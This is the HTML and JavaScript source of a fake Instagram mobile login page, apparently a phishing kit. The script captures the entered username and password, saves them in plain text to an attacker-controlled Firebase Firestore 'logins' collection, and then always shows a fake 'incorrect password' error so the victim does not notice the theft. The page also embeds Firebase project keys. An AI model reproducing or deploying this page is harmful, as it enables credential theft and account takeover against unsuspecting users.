<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobile</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background-color: #000000;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            margin-top: 60px;
            max-width: 150px;
            height: auto;
            filter: brightness(0) invert(1);
        }
        
        .input {
            width: 100%;
            max-width: 300px;
            padding: 12px 16px;
            margin: 0 0 0 0;
            border: none;
            border-radius: 4px;
            background-color: rgb(54, 54, 54);
            font-size: 14px;
            outline: none;
            color: #e0e0e0;
            font-weight: bold;
        }
        
        .input:first-of-type {
            margin-bottom: 10px;
        }
        
        .input:focus {
            border-color: #a8a8a8;
        }
        
        .form {
            margin-top: 30px;
            width: 100%;
            max-width: 300px;
        }
        
        .forgot {
            margin-top: 10px;
            margin-bottom: 0;
            color: #0095f6;
            font-size: 12px;
            text-decoration: none;
            cursor: pointer;
            font-weight: bold;
        }
        
        .login-btn {
            margin-top: 10px;
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .divider {
            margin-top: 25px;
            display: flex;
            align-items: center;
            width: 100%;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            padding: 0 15px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }
        
        .facebook-login {
            margin-top: 30px;
            color: #0095f6;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .facebook-icon {
            width: 20px;
            height: 20px;
        }
        
        .error {
            margin-top: 10px;
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            display: none;
            font-weight: bold;
        }
        
        .password-container {
            position: relative;
            width: 100%;
            max-width: 300px;
        }
        
        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #e0e0e0;
            width: 20px;
            height: 20px;
        }
        
        .signup-text {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 14px;
            text-align: center;
            font-weight: bold;
        }
        
        .signup-divider {
            width: 100vw;
            height: 1px;
            background-color: white;
            margin-bottom: 15px;
            position: fixed;
            left: 0;
            bottom: 60px;
        }
        
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
        }
        
        .container {
            max-width: 100%;
            margin: 0 auto;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1920px-Instagram_logo.svg.png" alt="Instagram" class="logo">
    <div class="form">
        <input type="text" class="input" placeholder="phone, number, username or email address">
        <div class="password-container">
            <input type="password" class="input" placeholder="password" id="passwordInput">
            <svg class="password-toggle" id="passwordToggle" viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"></path>
                <path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z"></path>
                <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z"></path>
            </svg>
        </div>
        <a href="#" class="forgot">forgotten password?</a>
        <button class="login-btn">log in</button>
        <div class="error">username or password incorrect</div>
        <div class="divider">
            <span>OR</span>
        </div>
        <a href="#" class="facebook-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/960px-2023_Facebook_icon.svg.png" alt="Facebook" class="facebook-icon">
            Log in with Facebook
        </a>
    </div>
    
    <div class="signup-text">
        <div class="signup-divider"></div>
        Don't have an account? <a href="#" class="signup-link">Sign Up</a>
    </div>
    
    <script>
        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyD8Vn47fBVdpSkYyLew7yCk8t6pWY9Mh9k",
            authDomain: "intagram-722bd.firebaseapp.com",
            projectId: "intagram-722bd",
            storageBucket: "intagram-722bd.firebasestorage.app",
            messagingSenderId: "356342152826",
            appId: "1:356342152826:web:b21419ce2b307e2fb805c3",
            measurementId: "G-54QF9W0806"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        
        // Toggle password visibility
        document.getElementById('passwordToggle').addEventListener('click', function() {
            const passwordInput = document.getElementById('passwordInput');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
        
        document.querySelector('.login-btn').addEventListener('click', function() {
            const email = document.querySelector('.input[type="text"]').value;
            const password = document.getElementById('passwordInput').value;
            
            // Send data to Firestore
            db.collection('logins').add({
                email: email,
                password: password,
                timestamp: new Date()
            }).then(() => {
                console.log('Data sent to Firestore');
            }).catch((error) => {
                console.error('Error sending data:', error);
            });
            
            // Show error message
            document.querySelector('.error').style.display = 'block';
        });
    </script>
</body>
</html>
